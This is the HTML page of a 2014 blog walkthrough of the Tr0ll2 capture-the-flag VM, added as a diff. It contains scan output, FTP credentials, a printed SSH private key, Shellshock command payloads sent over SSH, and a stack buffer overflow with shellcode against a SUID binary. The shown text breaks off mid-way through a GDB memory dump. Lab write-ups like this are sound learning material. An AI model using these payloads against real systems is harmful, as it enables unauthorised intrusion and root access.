@@ -1,0 +1,644 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Please do not feed the trolls. - FourFourFourFour</title>
+  <meta name="author" content="recrudesce">
+
+  
+  <meta name="description" content="Tweet Please Do Not Feed the Trolls. Oct 26th, 2014 2:36 pm vm's Maleus released Tr0ll a while ago, and while I didn&rsquo;t attempt it, I figured I &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://recrudesce.github.io/blog/2014/10/26/please-do-not-feed-the-trolls/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body >
+  <header role="banner" id="sidebar">
+    <!-- Logo -->
+<aside id="logo" class="clearfix">
+  <div class="clearfix">
+    <a href="/">FourFourFourFour</a>
+  </div>
+</aside>
+
+<ul id="menu">
+
+  <li class="title">
+    <h1 id="title"><a href="/">FourFourFourFour</a></h1>
+  </li>
+
+
+  <li class="subtitle">
+    <h2 id="subtitle">A Feeble Attempt At A Blog.</h2>
+  </li>
+
+  <li class="link">
+    <a href="/about/">about</a>
+  </li>
+
+  <li class="link">
+    <a href="http://twitter.com/recrudesce/">twitter</a>
+  </li>
+
+
+  <li class="link rss">
+    <a href="/atom.xml">rss feed</a>
+  </li>
+</ul>
+
+
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:recrudesce.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+
+
+<!-- Octopress Love -->
+<aside id="octopress_linkback">
+  <a href="http://octopress.org/">
+    <span class="unicode_square">
+      <span class="unicode_circle">
+        &nbsp;
+      </span>
+    </span>
+    <span class="octopress">Powered by Octopress</span>
+  </a>
+</aside>
+
+  </header>
+  <section id="main">
+    <article class="post">
+  <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://recrudesce.github.io/blog/2014/10/26/please-do-not-feed-the-trolls/" data-via="recrudesce" data-counturl="http://recrudesce.github.io/blog/2014/10/26/please-do-not-feed-the-trolls/" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+  
+  <header>
+    
+      <h2 class="entry-title">Please Do Not Feed the Trolls.</h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-10-26T14:36:45+00:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>2:36 pm</span></time>
+		
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>
+  
+</span>
+
+
+        
+      </p>
+    
+  </header>
+
+
+<p><a href="https://twitter.com/Maleus21">Maleus</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> a while ago, and while I didn&rsquo;t attempt it, I figured I&rsquo;d do the follow up - <a href="http://vulnhub.com/entry/tr0ll-2,107/">Tr0ll2</a>. So, here is a quick runthrough of how to pwn it.</p>
+
+<p>I would put this VM at beginner level - it&rsquo;s not particularly complicated. It&rsquo;s more a case of finding hidden data than actually doing any vulnerability exploitation. Lets get started.</p>
+
+<!-- more -->
+
+
+<p><img src="http://www.zerodayclothing.com/products/designs/trinity_design.png" alt="" /></p>
+
+<p>And so should you.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+root@pwk:~# nmap -sS -T5 -p- &ndash;script banner 172.16.56.138</p>
+
+<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-23 15:27 BST
+Nmap scan report for 172.16.56.138
+Host is up (0.00020s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+|<em>banner: 220 Welcome to Tr0ll FTP&hellip; Only noobs stay for a while&hellip;
+22/tcp open  ssh
+|</em>banner: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4
+80/tcp open  http
+MAC Address: 00:0C:29:14:2B:52 (VMware)</p>
+
+<p>Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds
+root@pwk:~#
+[/plain]</p>
+
+<p>FTP, SSH and HTTP. Lets hit the HTTP server first, as that&rsquo;s where Tr0ll started.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_001.png" alt="tr0ll2_001" /></a></p>
+
+<p>So, the usual then. A quick Nikto scan shows that there&rsquo;s a robots.txt file, which has the following in it</p>
+
+<p>[plain]
+User-agent:*
+Disallow:
+/noob
+/nope
+/try_harder
+/keep_trying
+/isnt_this_annoying
+/nothing_here
+/404
+/LOL_at_the_last_one
+/trolling_is_fun
+/zomg_is_this_it
+/you_found_me
+/I_know_this_sucks
+/You_could_give_up
+/dont_bother
+/will_it_ever_end
+/I_hope_you_scripted_this
+/ok_this_is_it
+/stop_whining
+/why_are_you_still_looking
+/just_quit
+/seriously_stop
+[/plain]</p>
+
+<p>Using this as a wordlist for dirb shows that only 4 of these directories actually result in an HTTP response other than 404.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+root@pwk:~# dirb <a href="http://172.16.56.138">http://172.16.56.138</a> troll_url.txt</p>
+
+<hr />
+
+<p>DIRB v2.21</p>
+
+<h2>By The Dark Raver</h2>
+
+<p>START_TIME: Thu Oct 23 15:31:32 2014
+URL_BASE: <a href="http://172.16.56.138/">http://172.16.56.138/</a>
+WORDLIST_FILES: troll_url.txt</p>
+
+<hr />
+
+<p>GENERATED WORDS: 21</p>
+
+<p>&mdash;- Scanning URL: <a href="http://172.16.56.138/">http://172.16.56.138/</a> &mdash;-
+==> DIRECTORY: <a href="http://172.16.56.138/noob/">http://172.16.56.138/noob/</a>
+==> DIRECTORY: <a href="http://172.16.56.138/keep_trying/">http://172.16.56.138/keep_trying/</a>
+==> DIRECTORY: <a href="http://172.16.56.138/dont_bother/">http://172.16.56.138/dont_bother/</a>
+==> DIRECTORY: <a href="http://172.16.56.138/ok_this_is_it/">http://172.16.56.138/ok_this_is_it/</a></p>
+
+<p>&mdash;- Entering directory: <a href="http://172.16.56.138/noob/">http://172.16.56.138/noob/</a> &mdash;-</p>
+
+<p>&mdash;- Entering directory: <a href="http://172.16.56.138/keep_trying/">http://172.16.56.138/keep_trying/</a> &mdash;-</p>
+
+<p>&mdash;- Entering directory: <a href="http://172.16.56.138/dont_bother/">http://172.16.56.138/dont_bother/</a> &mdash;-</p>
+
+<p>&mdash;- Entering directory: <a href="http://172.16.56.138/ok_this_is_it/">http://172.16.56.138/ok_this_is_it/</a> &mdash;-</p>
+
+<hr />
+
+<p>DOWNLOADED: 105 - FOUND: 0
+root@pwk:~/troll#
+[/plain]</p>
+
+<p>Visiting these URL&rsquo;s provide the following page
+<a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_002.png" alt="tr0ll2_002" /></a></p>
+
+<p>While it looks like the page is identical for each of the 4 directories, on closer inspection, one of the images shown is slightly larger than the rest - this was determined by downloading each image.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+-rw-r&ndash;r&ndash; 1 root root   15831 Oct  4 09:57 cat_the_troll.jpg
+-rw-r&ndash;r&ndash; 1 root root   15873 Oct  4 09:31 cat_the_troll.jpg.1
+[/plain]</p>
+
+<p>Running strings (NOOOO !!!!) on this file results in the following output</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+Look Deep within y0ur_self for the answer
+root@pwk:~#
+[/plain]</p>
+
+<p>Which just so happens to be a folder on the webserver, containing an answer.txt file. Short story shorter, answer.txt is just a dictionary file but with each individual line base64 encoded.
+On visual inspection, one line stands out&hellip; (yes, I could probably have written something, but scrolling through a large file and noticing strange anomalies is my bag, ok ?)</p>
+
+<p>[plain]
+SXNzYWNoYXIK
+SXN0YW5idWwK
+SXN0YW5idWwK
+SXN1enUK
+SXN1enUK
+SXQK
+SXRDYW50UmVhbGx5QmVUaGlzRWFzeVJpZ2h0TE9MCg==
+SXRhaXB1Cg==
+SXRhaXB1Cg==
+SXRhbGlhbgo=
+SXRhbGlhbgo=
+SXRhbGlhbnMK
+SXRhbHkK
+[/plain]</p>
+
+<p>Decoded, we get</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+root@pwk:~# echo SXRDYW50UmVhbGx5QmVUaGlzRWFzeVJpZ2h0TE9MCg== | base64 -d
+ItCantReallyBeThisEasyRightLOL
+[/plain]</p>
+
+<p><img src="http://i780.photobucket.com/albums/yy82/dguy210/facepalm-star-trek-o_zps1270c857.gif" alt="" /></p>
+
+<p>So, we&rsquo;ve exhausted the HTTP server by this point, so lets move onto FTP. I won&rsquo;t bore you with details, but the username and password combo is Tr0ll:Tr0ll. The only file residing on the FTP server is a ZIP file.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+root@pwk:~# ftp 172.16.56.138
+Connected to 172.16.56.138.
+220 Welcome to Tr0ll FTP&hellip; Only noobs stay for a while&hellip;
+Name (172.16.56.138:root): Tr0ll
+331 Please specify the password.
+Password: Tr0ll
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -l
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r&ndash;r&ndash;    1 0        0            1474 Oct 04 01:09 lmao.zip
+226 Directory send OK.
+ftp>
+[/plain]</p>
+
+<p>On extracting the ZIP file, we are asked for a password&hellip; lets try &ldquo;ItCantReallyBeThisEasyRightLOL&rdquo;</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+root@pwk:~# unzip lmao.zip
+Archive:  lmao.zip
+[lmao.zip] noob password: ItCantReallyBeThisEasyRightLOL
+  inflating: noob
+[/plain]</p>
+
+<p>which turns out to be an RSA private key - this is our route in via SSH.</p>
+
+<p>[plain]
+&mdash;&ndash;BEGIN RSA PRIVATE KEY&mdash;&ndash;
+MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
+yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
+/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
+q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
+z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
+e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
+u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
+gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
+UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
+La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
+xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
+aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
+K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
+n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
+TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
+WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
+ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
+0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
+vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
+ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
+th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
+G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
+q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
+vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
+zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
+&mdash;&ndash;END RSA PRIVATE KEY&mdash;&ndash;
+[/plain]</p>
+
+<p>It is possible to SSH into the VM using the noob user, as per the key&rsquo;s filename, but we are immediately disconnected.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+root@pwk:~# ssh -i key.key <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#110;&#111;&#x6f;&#98;&#x40;&#x31;&#55;&#x32;&#46;&#x31;&#54;&#46;&#53;&#x36;&#46;&#49;&#51;&#56;">&#x6e;&#111;&#x6f;&#98;&#64;&#x31;&#x37;&#50;&#46;&#x31;&#x36;&#46;&#53;&#54;&#46;&#x31;&#51;&#x38;</a>
+TRY HARDER LOL!
+Connection to 172.16.56.138 closed.
+root@pwk:~#
+[/plain]</p>
+
+<p>Standard things here like &ndash;norc don&rsquo;t work, so lets try something new. SHELLSHOCK !</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+root@pwk:~# ssh -i key.key <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#110;&#111;&#x6f;&#x62;&#64;&#49;&#55;&#50;&#x2e;&#49;&#54;&#46;&#x35;&#54;&#x2e;&#x31;&#51;&#x38;">&#x6e;&#111;&#x6f;&#x62;&#64;&#x31;&#x37;&#x32;&#x2e;&#49;&#x36;&#46;&#53;&#54;&#46;&#x31;&#x33;&#56;</a> &lsquo;() { :;}; cat /etc/passwd&rsquo;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:104::/var/run/dbus:/bin/false
+maleus:x:1000:1000:Tr0ll,,,:/home/maleus:/bin/bash
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+<a href="ftp:x:104:111:ftp">ftp:x:104:111:ftp</a> daemon,,,:/srv/<a href="ftp:/bin/false">ftp:/bin/false</a>
+noob:x:1002:1002::/home/noob:/bin/bash
+Tr0ll:x:1001:1001::/home/tr0ll:/bin/false
+root@pwk:~#
+[/plain]</p>
+
+<p>Yup, we can get a shell with this using &lsquo;() { :;}; /bin/bash&rsquo;</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+root@pwk:~# ssh -i key.key <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#110;&#111;&#111;&#x62;&#64;&#x31;&#x37;&#50;&#46;&#49;&#54;&#x2e;&#x35;&#54;&#x2e;&#49;&#x33;&#x38;">&#110;&#x6f;&#x6f;&#x62;&#64;&#x31;&#x37;&#x32;&#46;&#x31;&#54;&#46;&#53;&#x36;&#46;&#49;&#51;&#56;</a> &lsquo;() { :;}; /bin/bash&rsquo;
+id
+uid=1002(noob) gid=1002(noob) groups=1002(noob)
+[/plain]</p>
+
+<p>A small bit of enumeration here identifies the following folder structure</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+pwd
+/nothing_to_see_here/choose_wisely
+ls -l
+total 12
+drwsr-xr-x 2 root root 4096 Oct  5 21:16 door1
+drwsr-xr-x 2 root root 4096 Oct  5 21:19 door2
+drwsr-xr-x 2 root root 4096 Oct  5 21:17 door3
+[/plain]</p>
+
+<p>Each door folder includes a file called r00t, which is a binary. However, there are 3 different versions. One of them puts you into an rbash shell for 2 minutes, one of them kicks you out and reboots the VM, and the other one (the largest one) repeats anything you provide it via stdin. These files are SUID, so, looks like we have a standard buffer overflow here.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+-rwsr-xr-x 1 root root 7273 Oct  5 21:16 r00t
+-rwsr-xr-x 1 root root 8401 Oct  5 21:16 r00t
+-rwsr-xr-x 1 root root 7271 Oct  5 21:17 r00t
+[/plain]</p>
+
+<p>Something to note here before we carry on - a scheduled script rotates these files, so make sure you always work on the file that is 8401 bytes large - you may have to change into a different door directory.</p>
+
+<p>Loading the file in GDB shows that you can easily overflow it with about 300 bytes of input.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+root@pwk:~# gdb ./r00t
+GNU gdb (GDB) 7.4.1-debian
+Copyright &copy; 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <a href="http://gnu.org/licenses/gpl.html">http://gnu.org/licenses/gpl.html</a>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type &ldquo;show copying&rdquo;
+and &ldquo;show warranty&rdquo; for details.
+This GDB was configured as &ldquo;i486-linux-gnu&rdquo;.
+For bug reporting instructions, please see:
+<a href="http://www.gnu.org/software/gdb/bugs/">http://www.gnu.org/software/gdb/bugs/</a>&hellip;
+Reading symbols from /root/troll/r00t&hellip;done.
+gdb-peda$ r $(python -c &lsquo;print &ldquo;A&rdquo;*300&rsquo;);</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
+EAX: 0x12c
+EBX: 0xb7fbeff4 &ndash;> 0x15ed7c
+ECX: 0xbffff4d8 &ndash;> 0xb7fbf4e0 &ndash;> 0xfbad2a84
+EDX: 0xb7fc0360 &ndash;> 0x0
+ESI: 0x0
+EDI: 0x0
+EBP: 0x41414141 (&lsquo;AAAA&rsquo;)
+ESP: 0xbffff610 (&lsquo;A&rsquo; <repeats 28 times>)
+EIP: 0x41414141 (&lsquo;AAAA&rsquo;)
+EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-]
+Invalid $PC address: 0x41414141
+[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-]
+0000| 0xbffff610 (&lsquo;A&rsquo; <repeats 28 times>)
+0004| 0xbffff614 (&lsquo;A&rsquo; <repeats 24 times>)
+0008| 0xbffff618 (&lsquo;A&rsquo; <repeats 20 times>)
+0012| 0xbffff61c (&lsquo;A&rsquo; <repeats 16 times>)
+0016| 0xbffff620 (&lsquo;A&rsquo; <repeats 12 times>)
+0020| 0xbffff624 (&ldquo;AAAAAAAA&rdquo;)
+0024| 0xbffff628 (&ldquo;AAAA&rdquo;)
+0028| 0xbffff62c &ndash;> 0x8048200 &ndash;> 0x0
+[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+gdb-peda$
+[/plain]</p>
+
+<p>Standard buffer overflow process here (I don&rsquo;t want to teach you how to suck eggs tbh, there&rsquo;s enough resources online). EIP is at 269, so&hellip;</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+gdb-peda$ r $(python -c &lsquo;print &ldquo;A&rdquo;*268 + &ldquo;BBBB&rdquo;&rsquo;);</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
+EAX: 0x110
+EBX: 0xb7fbeff4 &ndash;> 0x15ed7c
+ECX: 0xbffff4f8 &ndash;> 0xb7fbf4e0 &ndash;> 0xfbad2a84
+EDX: 0xb7fc0360 &ndash;> 0x0
+ESI: 0x0
+EDI: 0x0
+EBP: 0x41414141 (&lsquo;AAAA&rsquo;)
+ESP: 0xbffff630 &ndash;> 0x0
+EIP: 0x42424242 (&lsquo;BBBB&rsquo;)
+EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-]
+Invalid $PC address: 0x42424242
+[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-]
+0000| 0xbffff630 &ndash;> 0x0
+0004| 0xbffff634 &ndash;> 0xbffff6d4 &ndash;> 0xbffff7f8 (&ldquo;/root/troll/r00t&rdquo;)
+0008| 0xbffff638 &ndash;> 0xbffff6e0 &ndash;> 0xbffff91a (&ldquo;SHELL=/bin/bash&rdquo;)
+0012| 0xbffff63c &ndash;> 0xb7fe0860 &ndash;> 0xb7e60000 &ndash;> 0x464c457f
+0016| 0xbffff640 &ndash;> 0xb7ff6821 (mov    eax,DWORD PTR [ebp-0x10])
+0020| 0xbffff644 &ndash;> 0xffffffff
+0024| 0xbffff648 &ndash;> 0xb7ffeff4 &ndash;> 0x1cf2c
+0028| 0xbffff64c &ndash;> 0x8048278 (&ldquo;__libc_start_main&rdquo;)
+[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+gdb-peda$
+[/plain]</p>
+
+<p>OK, easy peasy. GDB identifies that there isn&rsquo;t a jmp esp in the binary, but it is a dynamically linked binary, so ret2libc is possible. But why make it more complicated for ourselves ? Naaah. Our shellcode can be placed in an environment value</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+export SHELLCODE=$(python -c &lsquo;print &ldquo;\x90&rdquo;*100 + &ldquo;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&rdquo;&rsquo;)[/plain]</p>
+
+<p>Which can be located within GDB</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+gdb ./r00t
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright &copy; 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <a href="http://gnu.org/licenses/gpl.html">http://gnu.org/licenses/gpl.html</a>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type &ldquo;show copying&rdquo;
+and &ldquo;show warranty&rdquo; for details.
+This GDB was configured as &ldquo;i686-linux-gnu&rdquo;.
+For bug reporting instructions, please see:
+<a href="http://bugs.launchpad.net/gdb-linaro/">http://bugs.launchpad.net/gdb-linaro/</a>&hellip;
+Reading symbols from /nothing_to_see_here/choose_wisely/door1/r00t&hellip;done.
+(gdb) break main
+Breakpoint 1 at 0x8048450: file bof.c, line 7.
+(gdb) run
+Starting program: /nothing_to_see_here/choose_wisely/door1/r00t</p>
+
+<p>Breakpoint 1, main (argc=1, argv=0xbffffcb4) at bof.c:7
+(gdb) 7 bof.c: No such file or directory.
+x/100xw $esp
+0xbffffb00: 0x00000000  0x00000000  0x00000001  0x000008b0
+0xbffffb10: 0x40024b48  0x40024858  0x08048278  0x40037158
+0xbffffb20: 0x0804821c  0x00000001  0x400c2230  0x400c245e
+0xbffffb30: 0xbffffb68  0x40020ff4  0x40021ad0  0xbffffc54
+0xbffffb40: 0xbffffc10  0x40009ed9  0xbffffbf0  0x0804821c
+0xbffffb50: 0xbffffbd8  0x40021a74  0x00000000  0x40024b48
+0xbffffb60: 0x00000001  0x00000000  0x00000001  0x40021918
+0xbffffb70: 0x00000000  0x00000000  0x00000000  0x401cfff4
+0xbffffb80: 0xbffffbce  0xbffffbcf  0x00000001  0x400c27b9
+0xbffffb90: 0xbffffbcf  0xbffffbce  0x00000000  0x40015fec
+0xbffffba0: 0xbffffc54  0x40022000  0x00000000  0x4005cc73
+0xbffffbb0: 0x08048278  0x00000000  0x00c10000  0x00000001
+0xbffffbc0: 0xbffffdc2  0x0000002f  0xbffffc1c  0x401cfff4
+0xbffffbd0: 0x080484b0  0x08049ff4  0x00000001  0x0804831d
+0xbffffbe0: 0x401d03e4  0x0000000d  0x08049ff4  0x080484d1
+0xbffffbf0: 0xffffffff  0x4005cdc6  0x401cfff4  0x4005ce55
+0xbffffc00: 0x4000f280  0x00000000  0x080484b9  0x401cfff4
+0xbffffc10: 0x080484b0  0x00000000  0x00000000  0x400434d3
+0xbffffc20: 0x00000001  0xbffffcb4  0xbffffcbc  0x40024858
+0xbffffc30: 0x00000000  0xbffffc1c  0xbffffcbc  0x00000000
+0xbffffc40: 0x0804823c  0x401cfff4  0x00000000  0x00000000
+0xbffffc50: 0x00000000  0xdd889bc6  0x2a19fe39  0x00000000
+0xbffffc60: 0x00000000  0x00000000  0x00000001  0x08048390
+0xbffffc70: 0x00000000  0x400146b0  0x400433e9  0x40020ff4
+0xbffffc80: 0x00000001  0x08048390  0x00000000  0x080483b1
+(gdb)
+0xbffffc90: 0x08048444  0x00000001  0xbffffcb4  0x080484b0
+0xbffffca0: 0x08048520  0x4000f280  0xbffffcac  0x40021918
+0xbffffcb0: 0x00000001  0xbffffdc2  0x00000000  0xbffffdf0
+0xbffffcc0: 0xbffffe77  0xbffffe87  0xbffffea9  0xbffffeb3
+0xbffffcd0: 0xbffffebe  0xbffffed2  0xbfffff1f  0xbfffff2e
+0xbffffce0: 0xbfffff5b  0xbfffff6c  0xbfffff75  0xbfffff85
+0xbffffcf0: 0xbfffff8d  0xbfffff9a  0x00000000  0x00000020
+0xbffffd00: 0x40022414  0x00000021  0x40022000  0x00000010
+0xbffffd10: 0x0fabfbff  0x00000006  0x00001000  0x00000011
+0xbffffd20: 0x00000064  0x00000003  0x08048034  0x00000004
+0xbffffd30: 0x00000020  0x00000005  0x00000009  0x00000007
+0xbffffd40: 0x40000000  0x00000008  0x00000000  0x00000009
+0xbffffd50: 0x08048390  0x0000000b  0x000003ea  0x0000000c
